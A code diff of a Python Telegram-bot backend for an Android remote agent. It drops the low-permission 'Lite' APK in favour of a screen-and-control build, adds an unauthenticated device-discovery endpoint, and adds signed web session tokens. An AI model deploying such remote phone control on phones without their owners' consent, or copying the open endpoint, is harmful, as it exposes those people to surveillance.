@@ -291,6 +291,19 @@ def init_db() -> None:
         )
         connection.execute(
             """
+            CREATE TABLE IF NOT EXISTS pending_devices (
+                device_id TEXT PRIMARY KEY,
+                name TEXT NOT NULL,
+                platform TEXT NOT NULL,
+                agent TEXT NOT NULL,
+                telemetry_json TEXT NOT NULL DEFAULT '{}',
+                last_seen INTEGER NOT NULL,
+                created_at INTEGER NOT NULL
+            )
+            """
+        )
+        connection.execute(
+            """
             CREATE TABLE IF NOT EXISTS commands (
                 command_id TEXT PRIMARY KEY,
                 owner_id TEXT NOT NULL,
@@ -2374,9 +2387,9 @@ async def start_pc_agent_build(message: Message) -> None:
     asyncio.create_task(watch_pc_agent_build(message, started_at))
 
 
-async def start_apk_build(message: Message, owner_id: int, app_name: str = "Hunter Agent", build_mode: str = "lite") -> None:
+async def start_apk_build(message: Message, owner_id: int, app_name: str = "Hunter Agent", build_mode: str = "full") -> None:
     app_name = (app_name or "Hunter Agent").strip()[:40] or "Hunter Agent"
-    build_mode = "full" if build_mode == "full" else "lite"
+    build_mode = "full"
 
     if not GITHUB_TOKEN:
         await message.answer(
@@ -3304,13 +3317,12 @@ def prepare_build_icon(owner_id: int, source_path: Path) -> str | None:
     return build_asset_url(owner_id, "icon.png")
 
 
-def trigger_github_apk_build(app_name: str, icon_url: str | None, build_mode: str = "lite") -> None:
+def trigger_github_apk_build(app_name: str, icon_url: str | None, build_mode: str = "full") -> None:
     trigger_github_workflow(
         GITHUB_WORKFLOW,
         {
             "app_name": app_name[:40],
             "icon_url": icon_url or "",
-            "build_mode": "full" if build_mode == "full" else "lite",
         },
     )
 
@@ -3379,9 +3391,7 @@ def apk_release_page_url() -> str:
 
 
 def release_apk_url(mode: str = "latest") -> str:
-    if mode == "lite":
-        return f"https://github.com/{GITHUB_REPO}/releases/download/android-agent-latest/{AGENT_LITE_APK_NAME}"
-    if mode == "full":
+    if mode in {"lite", "full"}:
         return f"https://github.com/{GITHUB_REPO}/releases/download/android-agent-latest/{AGENT_FULL_APK_NAME}"
     return AGENT_APK_URL or f"https://github.com/{GITHUB_REPO}/releases/download/android-agent-latest/{AGENT_APK_NAME}"
 
@@ -3544,15 +3554,11 @@ def apk_build_status_text() -> str:
 def apk_list_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(
         inline_keyboard=[
-            [InlineKeyboardButton(text="Скачать Lite APK", url=release_apk_url("lite"))],
             [InlineKeyboardButton(text="Скачать Full APK", url=release_apk_url("full"))],
             [InlineKeyboardButton(text="Открыть страницу установки", url=f"{public_server_url()}/agent")],
             [InlineKeyboardButton(text="Статус сборки APK", callback_data="apk_build_status")],
             [InlineKeyboardButton(text="Своё APK: название + иконка", callback_data="custom_apk_help")],
-            [
-                InlineKeyboardButton(text="Собрать Lite", callback_data="connect_build_now"),
-                InlineKeyboardButton(text="Собрать Full", callback_data="connect_build_full"),
-            ],
+            [InlineKeyboardButton(text="Собрать Full APK", callback_data="connect_build_full")],
             [InlineKeyboardButton(text="Получить QR для подключения", callback_data="pair_device")],
             nav_row("connect_wizard"),
         ]
@@ -3704,12 +3710,54 @@ def device_exists(owner_id: str, device_id: str) -> bool:
     return row is not None
 
 
+def upsert_pending_device(raw_device: dict) -> dict:
+    device_id = str(raw_device.get("device_id", "")).strip()[:128]
+    if not device_id:
+        raise ValueError("device_id is required")
+    telemetry = raw_device.get("telemetry")
+    if not isinstance(telemetry, dict):
+        telemetry = {}
+    now = int(time.time())
+    device = {
+        "owner_id": "", "device_id": device_id,
+        "name": str(raw_device.get("name", "Android device")).strip()[:80] or "Android device",
+        "type": "phone", "platform": str(raw_device.get("platform", "Android")).strip()[:40],
+        "agent": "android-agent", "telemetry": telemetry,
+        "last_seen": now, "created_at": now, "online": True, "pairing_required": True,
+    }
+    with db_connect() as connection:
+        row = connection.execute("SELECT created_at FROM pending_devices WHERE device_id = ?", (device_id,)).fetchone()
+        if row:
+            device["created_at"] = int(row["created_at"])
+        connection.execute(
+            """INSERT INTO pending_devices(device_id, name, platform, agent, telemetry_json, last_seen, created_at)
+               VALUES (?, ?, ?, ?, ?, ?, ?)
+               ON CONFLICT(device_id) DO UPDATE SET name=excluded.name, platform=excluded.platform,
+               agent=excluded.agent, telemetry_json=excluded.telemetry_json, last_seen=excluded.last_seen""",
+            (device_id, device["name"], device["platform"], device["agent"], json.dumps(telemetry, ensure_ascii=False), now, device["created_at"]),
+        )
+    return device
+
+
+def list_pending_devices() -> list[dict]:
+    now = int(time.time())
+    with db_connect() as connection:
+        rows = connection.execute("SELECT * FROM pending_devices ORDER BY last_seen DESC").fetchall()
+    return [{
+        "owner_id": "", "device_id": row["device_id"], "name": row["name"], "type": "phone",
+        "platform": row["platform"], "agent": row["agent"],
+        "telemetry": decode_json_object(row["telemetry_json"]), "last_seen": int(row["last_seen"]),
+        "created_at": int(row["created_at"]), "online": now - int(row["last_seen"]) <= DEVICE_TTL_SECONDS,
+        "pairing_required": True, "diagnostics": {}, "health": {"state": "setup", "label": "Требуется QR"},
+    } for row in rows]
+
+
 def list_devices_for_user(owner_id: str) -> list[dict]:
     return list_devices(owner_id=str(owner_id))
 
 
 def list_all_devices() -> list[dict]:
-    return list_devices(owner_id="")
+    return list_pending_devices() + list_devices(owner_id="")
 
 
 def list_devices(owner_id: str = "") -> list[dict]:
@@ -3799,7 +3847,30 @@ def webapp_user_id_from_query(query: dict) -> str:
     validated = validate_telegram_init_data(init_data)
     user = (validated or {}).get("user") or {}
     user_id = str(user.get("id") or "").strip()
-    return user_id if user_id.isdigit() else ""
+    if user_id.isdigit():
+        return user_id
+    return validate_web_session_token(query_value(query, "web_token"))
+
+
+def create_web_session_token(user_id: str, ttl_seconds: int = 30 * 24 * 60 * 60) -> str:
+    if not BOT_TOKEN or not str(user_id).isdigit():
+        return ""
+    payload = f"{user_id}.{now_ts() + ttl_seconds}"
+    signature = hmac.new(BOT_TOKEN.encode("utf-8"), payload.encode("utf-8"), hashlib.sha256).hexdigest()
+    return f"{payload}.{signature}"
+
+
+def validate_web_session_token(token: str) -> str:
+    if not BOT_TOKEN:
+        return ""
+    parts = str(token or "").split(".")
+    if len(parts) != 3 or not parts[0].isdigit() or not parts[1].isdigit():
+        return ""
+    payload = f"{parts[0]}.{parts[1]}"
+    expected = hmac.new(BOT_TOKEN.encode("utf-8"), payload.encode("utf-8"), hashlib.sha256).hexdigest()
+    if not hmac.compare_digest(expected, parts[2]) or int(parts[1]) <= now_ts():
+        return ""
+    return parts[0]
 
 
 def webapp_user_id_from_payload(payload: dict) -> str:
@@ -3808,6 +3879,8 @@ def webapp_user_id_from_payload(payload: dict) -> str:
     user_id = str(user.get("id") or "").strip()
     actor_id = str(payload.get("actor_id", "")).strip()
     if not user_id.isdigit():
+        user_id = validate_web_session_token(str(payload.get("web_token", "")))
+    if not user_id:
         return ""
     if actor_id and actor_id != user_id:
         return ""
@@ -4086,6 +4159,35 @@ class MiniAppRequestHandler(SimpleHTTPRequestHandler):
             )
             return
 
+        if parsed_url.path == "/api/timeline":
+            query = parse_qs(parsed_url.query)
+            actor_id = webapp_user_id_from_query(query)
+            if not actor_id:
+                self.send_json({"error": "bad Telegram WebApp auth"}, HTTPStatus.UNAUTHORIZED)
+                return
+            role = get_user_role(actor_id)
+            if role == "guest":
+                self.send_json({"error": "bot access required"}, HTTPStatus.FORBIDDEN)
+                return
+            try:
+                limit = max(1, min(int(query_value(query, "limit") or 20), 50))
+            except ValueError:
+                limit = 20
+            events = [audit_row_to_dict(row) for row in timeline_events_for_user(actor_id, limit)]
+            self.send_json({"events": events, "role": role, "integrity": verify_audit_chain()})
+            return
+
+        if parsed_url.path == "/api/web-session":
+            query = parse_qs(parsed_url.query)
+            init_data = query.get("init_data", [""])[0]
+            validated = validate_telegram_init_data(init_data)
+            user_id = str(((validated or {}).get("user") or {}).get("id") or "").strip()
+            if not user_id.isdigit() or get_user_role(user_id) == "guest":
+                self.send_json({"error": "fresh Telegram WebApp auth required"}, HTTPStatus.UNAUTHORIZED)
+                return
+            self.send_json({"web_token": create_web_session_token(user_id), "user_id": user_id, "expires_in": 30 * 24 * 60 * 60})
+            return
+
         if parsed_url.path == "/api/devices":
             query = parse_qs(parsed_url.query)
             owner_id = query.get("owner_id", [""])[0].strip()
@@ -4208,7 +4310,6 @@ class MiniAppRequestHandler(SimpleHTTPRequestHandler):
         apk_path = agent_apk_path()
         download_url = f"{public_server_url()}/{AGENT_APK_NAME}"
         release_url = release_apk_url()
-        lite_url = release_apk_url("lite")
         full_url = release_apk_url("full")
         actions_url = f"https://github.com/{GITHUB_REPO}/actions/workflows/{GITHUB_WORKFLOW}"
         mini_app_url = MINI_APP_URL or public_server_url()
@@ -4252,11 +4353,6 @@ class MiniAppRequestHandler(SimpleHTTPRequestHandler):
 
         mode_cards = f"""
       <div class="mode-grid">
-        <a class="mode-card" href="{escape(lite_url, quote=True)}">
-          <span>Lite APK</span>
-          <strong>Подключение и статус</strong>
-          <small>QR, Online/Offline, батарея, сеть, меньше разрешений.</small>
-        </a>
         <a class="mode-card strong" href="{escape(full_url, quote=True)}">
           <span>Full APK</span>
           <strong>Экран и управление</strong>
@@ -4445,6 +4541,17 @@ class MiniAppRequestHandler(SimpleHTTPRequestHandler):
             self.handle_pair_claim()
             return
 
+        if parsed_url.path == "/api/devices/discover":
+            try:
+                raw_body = self.rfile.read(content_length).decode("utf-8")
+                payload = json.loads(raw_body or "{}")
+                device = upsert_pending_device(payload)
+            except (json.JSONDecodeError, ValueError) as exc:
+                self.send_json({"error": str(exc)}, HTTPStatus.BAD_REQUEST)
+                return
+            self.send_json({"ok": True, "device": device})
+            return
+
         if parsed_url.path == "/api/devices/command":
             self.handle_create_command()
             return
@@ -4517,6 +4624,8 @@ class MiniAppRequestHandler(SimpleHTTPRequestHandler):
             device_id = str(payload.get("device_id", "")).strip()
             was_known = device_exists(owner_id, device_id) if device_id else False
             device = upsert_device(payload)
+            with db_connect() as connection:
+                connection.execute("DELETE FROM pending_devices WHERE device_id = ?", (device["device_id"],))
             audit_event(
                 owner_id,
                 "device_paired" if not was_known else "device_repaired",
